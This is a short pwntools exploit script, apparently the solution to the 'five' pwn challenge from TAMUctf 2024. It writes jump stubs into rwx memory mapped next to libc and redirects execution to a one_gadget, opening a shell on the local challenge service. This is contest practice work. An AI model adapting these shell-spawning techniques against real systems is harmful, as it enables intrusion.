from pwn import *

elf = ELF("./five_patched")
context.binary = elf

# locally
"""
0x00007f6bc7b0f000 0x00007f6bc7b10000 0x0000000000000000 rwx
0x00007f6bc7b10000 0x00007f6bc7b32000 0x0000000000000000 r-- /home/nhwn/git/tamuctf-2024/pwn/five/libc.so.6
"""
# in docker
"""
7ff86f172000-7ff86f194000 r--p 00000000 08:20 32858                      /lib/x86_64-linux-gnu/libc-2.28.so
7ff86f194000-7ff86f2db000 r-xp 00022000 08:20 32858                      /lib/x86_64-linux-gnu/libc-2.28.so
7ff86f2db000-7ff86f327000 r--p 00169000 08:20 32858                      /lib/x86_64-linux-gnu/libc-2.28.so
7ff86f327000-7ff86f328000 ---p 001b5000 08:20 32858                      /lib/x86_64-linux-gnu/libc-2.28.so
7ff86f328000-7ff86f32c000 r--p 001b5000 08:20 32858                      /lib/x86_64-linux-gnu/libc-2.28.so
7ff86f32c000-7ff86f32e000 rw-p 001b9000 08:20 32858                      /lib/x86_64-linux-gnu/libc-2.28.so
7ff86f32e000-7ff86f334000 rw-p 00000000 00:00 0
7ff86f335000-7ff86f336000 rwxp 00000000 00:00 0
"""

main = elf.sym["main"]

if args.REMOTE:
    p = remote("localhost", 1337)
    page_offset = -0x1c3000
else:
    p = process()
    # p = elf.debug()
    page_offset = 0x1000

# force mmap to be allocated next to libc
og = 0x4497f
s = b"\xe9" + p32(-0x10000 + (main & 0xfff) - 5, signed=True)
p.send(s)

s2 = b"\xe9" + p32(page_offset + og - 5, signed=True)
p.send(s2)
p.interactive()
